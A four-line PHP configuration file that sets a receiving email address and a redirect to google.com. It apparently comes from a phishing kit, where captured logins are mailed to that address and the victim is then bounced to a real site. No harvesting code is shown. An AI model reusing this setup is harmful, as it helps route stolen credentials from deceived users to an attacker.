<?php 
$Receive_email="youme156620@gmail.com";
$redirect="https://www.google.com/";
?>